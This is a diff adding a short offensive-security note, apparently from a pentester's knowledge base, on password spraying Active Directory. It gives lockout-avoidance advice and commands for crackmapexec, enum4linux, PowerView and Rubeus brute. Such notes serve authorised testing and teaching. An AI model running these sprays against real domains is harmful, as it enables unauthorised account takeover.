@@ -1,0 +1,63 @@
+# Active Directory Password Spraying
+
+> Spray common passwords for known usernames in an Active Directory environment.
+
+---
+
+## Minimum Password Length
+
+Active Directory's default minimum password length is 7 characters. Make sure the passwords you try at at least that long.
+
+If you have a domain user's credentials, [[password-spraying#Determine the Domain's Password Policy|determine the domain's password policy]].
+
+---
+
+## Account Lockout Threshold
+
+Active Directory's default number of incorrect login attempts before lockout is 10 attempts. Generally don't try more than 5-7 attempts.
+
+If you have a domain user's credentials, [[password-spraying#Determine the Domain's Password Policy|determine the domain's password policy]].
+
+---
+
+## Determine the Domain's Password Policy
+
+You need a domain user's credentials for these.
+
+```bash
+crackmapexec smb $DOMAIN_CONTROLLER_HOSTNAME_OR_IP -u $USERNAME -p $PASSWORD --pass-pol
+```
+
+```bash
+enum4linx -u $USERNAME -p $PASSWORD -P $DOMAIN_CONTROLLER_HOSTNAME_OR_IP
+```
+
+From [[powerview|PowerView]]:
+
+```powershell
+(Get-DomainPolicy).SystemAccess
+```
+
+---
+
+## [[statistically-likely-lists|Statistically Likely Password Lists]]
+
+---
+
+## Password Spray an Active Directory Domain
+
+### From Linux:
+
+[[crackmapexec#Pass a domain credential to a target to check for access|Password spray an Active Directory domain]].
+
+### From a domain-joined Windows machine:
+
+```powershell
+Rubeus.exe brute [/domain:$DOMAIN] [/users:$USERS_FILE] [/password:$PASSWORD] [/passwords:$PASSWORDS_FILE] [/outfile:$OUTPUT_FILE] [/noticket]
+```
+
+- `/domain`: if omitted, uses the current domain
+- `/users`: if omitted, tries current domain users
+- You need either `/password` or `/passwords`
+- If you don't use `/outfile`, the results will be written to `stdout`.
+- `/noticket`: if omitted, a corresponding TGT will be written to `stdout` for each successful credential discovered. If present, it will be written to `.\$USERNAME.kirbi` where `$USERNAME` is the username of the user whose credential was discovered. 
